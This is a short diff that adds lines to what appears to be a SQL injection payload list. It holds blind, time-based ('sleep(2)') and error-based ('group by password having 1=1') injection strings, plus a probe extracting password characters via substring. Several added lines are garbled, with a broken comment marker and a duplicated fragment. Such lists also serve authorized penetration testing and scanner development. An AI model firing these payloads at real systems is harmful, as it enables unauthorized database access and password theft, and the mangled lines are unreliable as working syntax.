@@ -43,3 +43,7 @@ like '%'
 ' and substring(database(),1,1)="a"--+
 ' and sleep(2) and "a"="a"--+
 ' and sleep(2) and substring(database(),1,1)="a"--+
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1- information_Schema.tables;# admin'
+and substring(password/text(),1,1)='7 ' and substring(password/text(),1,1)='7
